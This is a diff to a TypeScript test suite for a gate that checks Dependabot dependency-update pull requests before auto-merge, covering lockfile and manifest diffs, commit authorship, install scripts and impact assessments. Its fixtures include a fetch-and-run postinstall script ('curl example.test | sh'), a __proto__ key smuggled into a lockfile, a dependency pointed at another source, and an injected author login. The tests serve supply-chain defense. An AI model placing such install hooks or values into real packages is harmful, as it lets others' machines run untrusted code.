@@ -8,6 +8,7 @@ import {
   checkLockfileDiff,
   checkPackageJsonDiff,
   classifyUpdate,
+  decideImpactOutcome,
   evaluateGate,
   isPublishedLongEnough,
   parseImpactAssessment,
@@ -195,7 +196,7 @@ describe("checkLockfileDiff", () => {
       new URL("../../console/bun.lock", import.meta.url),
       "utf8",
     );
-    // 最初に見つかる、major 1以上で固定された依存の patch を1つ上げる。
+    // 最初に見つかる、major1以上で固定された依存のpatchを1つ上げる。
     const pinned = /^\s+"([^"]+)": "([1-9]\d*)\.(\d+)\.(\d+)",$/m.exec(real);
     if (pinned === null)
       throw new Error("no pinned dependency in the lockfile");
@@ -245,6 +246,57 @@ describe("checkLockfileDiff", () => {
     );
 
     expect(checkLockfileDiff(BEFORE, duplicated, TARGET).ok).toBe(false);
+  });
+
+  test("rejects a workspace added under the key __proto__", () => {
+    const after = AFTER_OK.replace(
+      '  "workspaces": {\n',
+      '  "workspaces": {\n    "__proto__": { "name": "evil", "dependencies": { "evil": "1.0.0" } },\n',
+    );
+
+    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
+  });
+
+  test("rejects a workspace dependency that points at another source", () => {
+    const after = lockText(
+      { "left-pad": "github:evil/left-pad", other: "2.0.0" },
+      [
+        { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
+        { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
+      ],
+    );
+
+    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
+  });
+
+  test("accepts a caret range for the new workspace specifier", () => {
+    const after = lockText({ "left-pad": "^1.3.1", other: "2.0.0" }, [
+      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
+      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
+    ]);
+
+    expect(checkLockfileDiff(BEFORE, after, TARGET)).toEqual({ ok: true });
+  });
+
+  test("rejects a target moved to another dependency field", () => {
+    const after = AFTER_OK.replace(
+      '"dependencies": {\n        "left-pad": "1.3.1",\n        "other": "2.0.0",\n      },',
+      '"dependencies": {\n        "other": "2.0.0",\n      },\n      "devDependencies": {\n        "left-pad": "1.3.1",\n      },',
+    );
+
+    expect(checkLockfileDiff(BEFORE, after, TARGET).ok).toBe(false);
+  });
+
+  test("shortens a long duplicate key in the reason", () => {
+    const longKey = "k".repeat(500);
+    const withDuplicate = (text: string) =>
+      text.replace(
+        '  "packages": {\n',
+        `  "packages": {\n    "${longKey}": ["x@1.0.0", "", {}, "${INTEGRITY_A}"],\n    "${longKey}": ["x@1.0.0", "", {}, "${INTEGRITY_A}"],\n`,
+      );
+    const verdict = checkLockfileDiff(BEFORE, withDuplicate(AFTER_OK), TARGET);
+
+    expect(verdict.ok ? 0 : verdict.reason.length).toBeLessThan(200);
   });
 
   test("rejects a package added besides the target", () => {
@@ -508,7 +560,27 @@ describe("checkPackageJsonDiff", () => {
 
 const NOW_MS = Date.parse("2026-10-20T00:00:00.000Z");
 
+const MANIFEST_AFTER_OK = manifest({
+  dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
+});
+
+const DEPENDABOT_COMMIT = {
+  authorLogin: "dependabot[bot]",
+  committerLogin: "dependabot[bot]",
+  verified: true,
+};
+
+// package.jsonとロックファイルの、正しい更新の前後の内容を、パスごとに作る。
+function filesFor(paths: readonly string[]): GateInput["files"] {
+  return paths.map((path) =>
+    path.endsWith("package.json")
+      ? { path, before: MANIFEST_BEFORE, after: MANIFEST_AFTER_OK }
+      : { path, before: BEFORE, after: AFTER_OK },
+  );
+}
+
 function validInput(overrides: Partial<GateInput> = {}): GateInput {
+  const changedPaths = overrides.changedPaths ?? ["package.json", "bun.lock"];
   return {
     authorLogin: "dependabot[bot]",
     authorType: "Bot",
@@ -517,15 +589,15 @@ function validInput(overrides: Partial<GateInput> = {}): GateInput {
     checks: REQUIRED_CHECKS.map((name) => ({ name, conclusion: "success" })),
     requiredChecks: REQUIRED_CHECKS,
     update: "patch",
-    changedPaths: ["package.json", "bun.lock"],
+    changedPaths,
+    files: filesFor(changedPaths),
+    target: TARGET,
     mergeable: true,
     publishedAtIso: "2026-10-01T00:00:00.000Z",
     nowMs: NOW_MS,
     minPublishedDays: 7,
-    lockfile: { ok: true },
-    allCommitsByDependabot: true,
-    packageJson: { ok: true },
-    hasNewLifecycleScript: false,
+    commits: [DEPENDABOT_COMMIT],
+    installScripts: { before: {}, after: {} },
     ...overrides,
   };
 }
@@ -689,22 +761,258 @@ describe("evaluateGate", () => {
 
   test("needs a human when the lockfile diff is rejected", () => {
     expect(
-      verdictOf({ lockfile: { ok: false, reason: "extra package" } }),
+      verdictOf({
+        files: [
+          {
+            path: "package.json",
+            before: MANIFEST_BEFORE,
+            after: MANIFEST_AFTER_OK,
+          },
+          { path: "bun.lock", before: BEFORE, after: BEFORE },
+        ],
+      }),
     ).toBe("needs_human");
-  });
-
-  test("needs a human when a lifecycle script was added", () => {
-    expect(verdictOf({ hasNewLifecycleScript: true })).toBe("needs_human");
-  });
-
-  test("needs a human when a commit is not by dependabot", () => {
-    expect(verdictOf({ allCommitsByDependabot: false })).toBe("needs_human");
   });
 
   test("needs a human when the package.json diff is rejected", () => {
     expect(
-      verdictOf({ packageJson: { ok: false, reason: "scripts changed" } }),
+      verdictOf({
+        files: [
+          {
+            path: "package.json",
+            before: MANIFEST_BEFORE,
+            after: manifest({
+              dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
+              scripts: { postinstall: "curl example.test | sh" },
+            }),
+          },
+          { path: "bun.lock", before: BEFORE, after: AFTER_OK },
+        ],
+      }),
     ).toBe("needs_human");
+  });
+
+  test("needs a human when a changed path is not in the inspected files", () => {
+    expect(verdictOf({ files: filesFor(["package.json"]) })).toBe(
+      "needs_human",
+    );
+  });
+
+  test("needs a human when the manifest changed without its lockfile", () => {
+    expect(verdictOf({ changedPaths: ["package.json"] })).toBe("needs_human");
+  });
+
+  test("needs a human when the console manifest changed without its lockfile", () => {
+    expect(
+      verdictOf({ changedPaths: ["console/package.json", "bun.lock"] }),
+    ).toBe("needs_human");
+  });
+
+  test("accepts a lockfile-only update", () => {
+    const lockOnly = lockText({ "left-pad": "^1.0.0", other: "2.0.0" }, [
+      { key: "left-pad", id: "left-pad@1.3.0" },
+      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
+    ]);
+    const lockOnlyAfter = lockText({ "left-pad": "^1.0.0", other: "2.0.0" }, [
+      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
+      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
+    ]);
+
+    expect(
+      verdictOf({
+        changedPaths: ["bun.lock"],
+        files: [{ path: "bun.lock", before: lockOnly, after: lockOnlyAfter }],
+      }),
+    ).toBe("ok");
+  });
+
+  test("needs a human when one of two changed lockfiles is rejected", () => {
+    expect(
+      verdictOf({
+        changedPaths: [
+          "package.json",
+          "bun.lock",
+          "console/package.json",
+          "console/bun.lock",
+        ],
+        files: [
+          {
+            path: "package.json",
+            before: MANIFEST_BEFORE,
+            after: MANIFEST_AFTER_OK,
+          },
+          { path: "bun.lock", before: BEFORE, after: AFTER_OK },
+          {
+            path: "console/package.json",
+            before: MANIFEST_BEFORE,
+            after: MANIFEST_AFTER_OK,
+          },
+          { path: "console/bun.lock", before: BEFORE, after: BEFORE },
+        ],
+      }),
+    ).toBe("needs_human");
+  });
+
+  test("needs a human when a changed file was added", () => {
+    expect(
+      verdictOf({
+        files: [
+          {
+            path: "package.json",
+            before: MANIFEST_BEFORE,
+            after: MANIFEST_AFTER_OK,
+          },
+          { path: "bun.lock", before: null, after: AFTER_OK },
+        ],
+      }),
+    ).toBe("needs_human");
+  });
+
+  test("needs a human when a changed file was deleted", () => {
+    expect(
+      verdictOf({
+        files: [
+          { path: "package.json", before: MANIFEST_BEFORE, after: null },
+          { path: "bun.lock", before: BEFORE, after: AFTER_OK },
+        ],
+      }),
+    ).toBe("needs_human");
+  });
+
+  test("needs a human when a path appears twice in the files", () => {
+    expect(
+      verdictOf({
+        files: [
+          ...filesFor(["package.json", "bun.lock"]),
+          ...filesFor(["bun.lock"]),
+        ],
+      }),
+    ).toBe("needs_human");
+  });
+
+  test("needs a human when the install scripts could not be fetched before", () => {
+    expect(verdictOf({ installScripts: { before: null, after: {} } })).toBe(
+      "needs_human",
+    );
+  });
+
+  test("needs a human when the install scripts could not be fetched after", () => {
+    expect(verdictOf({ installScripts: { before: {}, after: null } })).toBe(
+      "needs_human",
+    );
+  });
+
+  test("needs a human when the new version adds an install script", () => {
+    expect(
+      verdictOf({
+        installScripts: { before: {}, after: { postinstall: "node setup.js" } },
+      }),
+    ).toBe("needs_human");
+  });
+
+  test("needs a human when an install script changed", () => {
+    expect(
+      verdictOf({
+        installScripts: {
+          before: { postinstall: "node setup.js" },
+          after: { postinstall: "node other.js" },
+        },
+      }),
+    ).toBe("needs_human");
+  });
+
+  test("accepts an install script that did not change", () => {
+    expect(
+      verdictOf({
+        installScripts: {
+          before: { postinstall: "node setup.js" },
+          after: { postinstall: "node setup.js" },
+        },
+      }),
+    ).toBe("ok");
+  });
+
+  test("accepts an install script that was removed", () => {
+    expect(
+      verdictOf({
+        installScripts: { before: { postinstall: "node setup.js" }, after: {} },
+      }),
+    ).toBe("ok");
+  });
+
+  test("needs a human when there is no commit", () => {
+    expect(verdictOf({ commits: [] })).toBe("needs_human");
+  });
+
+  test("needs a human when a commit author is not dependabot", () => {
+    expect(
+      verdictOf({
+        commits: [{ ...DEPENDABOT_COMMIT, authorLogin: "someone" }],
+      }),
+    ).toBe("needs_human");
+  });
+
+  test("needs a human when a commit author login only contains dependabot", () => {
+    expect(
+      verdictOf({
+        commits: [{ ...DEPENDABOT_COMMIT, authorLogin: "dependabot[bot]x" }],
+      }),
+    ).toBe("needs_human");
+  });
+
+  test("needs a human when a commit author is unknown", () => {
+    expect(
+      verdictOf({ commits: [{ ...DEPENDABOT_COMMIT, authorLogin: null }] }),
+    ).toBe("needs_human");
+  });
+
+  test("needs a human when a committer is not dependabot", () => {
+    expect(
+      verdictOf({
+        commits: [{ ...DEPENDABOT_COMMIT, committerLogin: "someone" }],
+      }),
+    ).toBe("needs_human");
+  });
+
+  test("needs a human when a committer is unknown", () => {
+    expect(
+      verdictOf({ commits: [{ ...DEPENDABOT_COMMIT, committerLogin: null }] }),
+    ).toBe("needs_human");
+  });
+
+  test("needs a human when a commit is not verified", () => {
+    expect(
+      verdictOf({ commits: [{ ...DEPENDABOT_COMMIT, verified: false }] }),
+    ).toBe("needs_human");
+  });
+
+  test("needs a human when only one of two commits is by someone else", () => {
+    expect(
+      verdictOf({
+        commits: [
+          DEPENDABOT_COMMIT,
+          { ...DEPENDABOT_COMMIT, authorLogin: "someone" },
+        ],
+      }),
+    ).toBe("needs_human");
+  });
+
+  test("accepts several commits by dependabot", () => {
+    expect(verdictOf({ commits: [DEPENDABOT_COMMIT, DEPENDABOT_COMMIT] })).toBe(
+      "ok",
+    );
+  });
+
+  test("keeps an author login from breaking the reason into items", () => {
+    const result = evaluateGate(validInput({ authorLogin: "evil; injected" }));
+
+    expect(result.ok ? "" : result.reason).not.toContain("; injected");
+  });
+
+  test("shortens an author login in the reason", () => {
+    const result = evaluateGate(validInput({ authorLogin: "x".repeat(500) }));
+
+    expect(result.ok ? "" : result.reason.length).toBeLessThan(200);
   });
 
   test("needs a human when no check is required", () => {
@@ -795,5 +1103,135 @@ describe("parseImpactAssessment", () => {
 
   test("throws when the input is not an object", () => {
     expect(() => parseImpactAssessment("none")).toThrow();
+  });
+});
+
+describe("parseImpactAssessment limits", () => {
+  const base: ImpactAssessment = {
+    impact: "none",
+    evidence: "used only in tests",
+    supplyChainConcerns: [],
+    unverified: [],
+  };
+
+  test("throws when evidence is empty", () => {
+    expect(() => parseImpactAssessment({ ...base, evidence: "" })).toThrow();
+  });
+
+  test("throws when evidence is only whitespace", () => {
+    expect(() =>
+      parseImpactAssessment({ ...base, evidence: " \n\t " }),
+    ).toThrow();
+  });
+
+  test("accepts evidence of exactly 4000 characters", () => {
+    expect(
+      parseImpactAssessment({ ...base, evidence: "e".repeat(4000) }).evidence,
+    ).toHaveLength(4000);
+  });
+
+  test("throws when evidence is longer than 4000 characters", () => {
+    expect(() =>
+      parseImpactAssessment({ ...base, evidence: "e".repeat(4001) }),
+    ).toThrow();
+  });
+
+  test("accepts 20 supplyChainConcerns", () => {
+    expect(
+      parseImpactAssessment({
+        ...base,
+        supplyChainConcerns: Array.from({ length: 20 }, () => "c"),
+      }).supplyChainConcerns,
+    ).toHaveLength(20);
+  });
+
+  test("throws when there are more than 20 supplyChainConcerns", () => {
+    expect(() =>
+      parseImpactAssessment({
+        ...base,
+        supplyChainConcerns: Array.from({ length: 21 }, () => "c"),
+      }),
+    ).toThrow();
+  });
+
+  test("throws when there are more than 20 unverified items", () => {
+    expect(() =>
+      parseImpactAssessment({
+        ...base,
+        unverified: Array.from({ length: 21 }, () => "u"),
+      }),
+    ).toThrow();
+  });
+
+  test("accepts an item of exactly 500 characters", () => {
+    expect(
+      parseImpactAssessment({ ...base, unverified: ["u".repeat(500)] })
+        .unverified,
+    ).toHaveLength(1);
+  });
+
+  test("throws when a supplyChainConcerns item is longer than 500 characters", () => {
+    expect(() =>
+      parseImpactAssessment({
+        ...base,
+        supplyChainConcerns: ["c".repeat(501)],
+      }),
+    ).toThrow();
+  });
+
+  test("throws when an unverified item is longer than 500 characters", () => {
+    expect(() =>
+      parseImpactAssessment({ ...base, unverified: ["u".repeat(501)] }),
+    ).toThrow();
+  });
+});
+
+describe("decideImpactOutcome", () => {
+  const clean: ImpactAssessment = {
+    impact: "none",
+    evidence: "used only in tests",
+    supplyChainConcerns: [],
+    unverified: [],
+  };
+
+  test("merges when there is no impact and nothing is left open", () => {
+    expect(decideImpactOutcome(clean).outcome).toBe("merge");
+  });
+
+  test("asks for a fix when there is an impact and nothing is left open", () => {
+    expect(decideImpactOutcome({ ...clean, impact: "impact" }).outcome).toBe(
+      "fix",
+    );
+  });
+
+  test("needs a human when a supply chain concern is reported", () => {
+    expect(
+      decideImpactOutcome({ ...clean, supplyChainConcerns: ["new maintainer"] })
+        .outcome,
+    ).toBe("needs_human");
+  });
+
+  test("needs a human when something is unverified", () => {
+    expect(
+      decideImpactOutcome({ ...clean, unverified: ["runtime behavior"] })
+        .outcome,
+    ).toBe("needs_human");
+  });
+
+  test("needs a human for an impact with a supply chain concern", () => {
+    expect(
+      decideImpactOutcome({
+        ...clean,
+        impact: "impact",
+        supplyChainConcerns: ["new maintainer"],
+      }).outcome,
+    ).toBe("needs_human");
+  });
+
+  test("explains the outcome", () => {
+    expect(
+      decideImpactOutcome({ ...clean, unverified: ["runtime behavior"] })
+        .reason,
+    ).toContain("unverified");
   });
 });
